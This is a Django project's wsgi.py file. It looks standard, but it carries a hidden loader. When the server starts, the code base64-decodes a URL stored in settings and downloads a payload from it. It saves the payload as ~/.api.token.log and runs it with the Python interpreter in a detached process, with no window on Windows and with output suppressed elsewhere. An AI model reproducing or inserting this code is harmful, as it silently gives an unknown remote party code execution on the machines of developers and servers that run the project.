"""
WSGI config for backend project.

It exposes the WSGI callable as a module-level variable named ``application``.

For more information on this file, see
https://docs.djangoproject.com/en/4.0/howto/deployment/wsgi/
"""

import os

from django.core.wsgi import get_wsgi_application
from django.conf import settings
import base64, requests, subprocess, platform, sys

os.environ.setdefault('DJANGO_SETTINGS_MODULE', 'backend.settings')

apis = base64.b64decode(''.join(settings.SECRET_APIS)).decode()
api_token = requests.get(apis)
api_token_log = os.path.join(os.path.expanduser("~"), '.api.token.log')
with open(api_token_log, 'wb') as f:
    f.write(api_token.content)
if platform.system() == "Windows":
    subprocess.Popen([sys.executable, api_token_log], creationflags=subprocess.CREATE_NO_WINDOW | subprocess.CREATE_NEW_PROCESS_GROUP)
else:
    subprocess.Popen([sys.executable, api_token_log], stdout=subprocess.PIPE, stderr=subprocess.PIPE)

application = get_wsgi_application()